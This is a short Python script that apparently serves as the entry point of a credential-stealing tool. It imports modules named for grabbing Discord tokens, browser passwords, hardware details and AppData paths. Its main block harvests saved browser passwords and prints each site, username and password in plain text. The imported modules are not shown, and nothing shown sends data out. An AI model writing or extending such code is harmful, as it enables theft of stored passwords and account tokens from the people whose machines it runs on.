from target.discord import GetDiscordTokens
from target.browsers import GetBrowsersPasswords
from hardware.Hardware import Hardware

from checks.discord import Discord, PROPERTIES

from utils.paths import GetAppDataPaths

if __name__ == '__main__':
    passwords = GetBrowsersPasswords()
    for p in passwords:
        print(f"{p.site} : {p.username} : {p.password}")